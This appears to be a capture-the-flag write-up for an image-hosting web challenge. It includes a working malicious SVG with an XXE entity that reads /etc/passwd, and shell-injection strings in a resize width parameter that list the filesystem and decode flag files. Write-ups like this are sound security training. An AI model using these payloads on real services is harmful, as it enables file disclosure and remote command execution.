# ImageHost (400 pts - WEB)

## Challenge Description
> Get the flag?

**URL:** `http://challenge.perfectroot.wiki:6238`

## TL;DR
Multi-stage attack chain: SVG file upload → XXE (XML External Entity) → Command Injection via ImageMagick → Base64-encoded flag retrieval

## Initial Analysis
- Image hosting service accepting JPG, PNG, GIF, **SVG**, WEBP
- Gallery page to view uploads
- Metadata viewing functionality
- SVG files are XML-based → potential XXE vulnerability

## Solution

### Step 1: Discover XXE in SVG
SVG files support XML External Entities. Created malicious SVG:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>
```

Uploaded and viewed via `metadata.php?id=XXX` → Successfully read `/etc/passwd`!

### Step 2: Discover Command Injection
Found `process.php` endpoint with resize functionality:
```
/process.php?id=3388&action=resize&width=800;ls&height=600
```

The command executed was:
```bash
convert 'input.svg' -resize 800;ls×600 'output.svg'
```

The semicolon injected a command, but `×600` was appended. Solution: Use `#` to comment out:
```
width=100;ls #
```

### Step 3: Locate the Flag
```python
payload = "100;ls -la / #"
```

Found flag hint at `/var/www/flag.txt`:
```
The flag is split across multiple files:
- /var/www/.flag_part1 (base64 encoded)
- /var/www/.flag_part2 (base64 encoded)  
- /var/www/.flag_part3 (base64 encoded)
```

### Step 4: Retrieve Flag
```python
payload = "100;cat /var/www/.flag_part* | base64 -d #"
```

## Flag
```
r00t{XXE_SVG_LFI_CMD_INJECTION_CHAIN_2025}
```

## Key Takeaways
- **Attack chaining** - Combined multiple vulnerabilities for maximum impact
- **SVG files are dangerous** - They're XML and support external entities
- **Input sanitization matters** - Command injection in image processing is critical
- **Defense:** Disable external entities in XML parsers, sanitize all user input to shell commands

## Tools Used
- Python `requests` library
- `curl` for testing
- `BeautifulSoup` for HTML parsing
- Browser DevTools for inspection
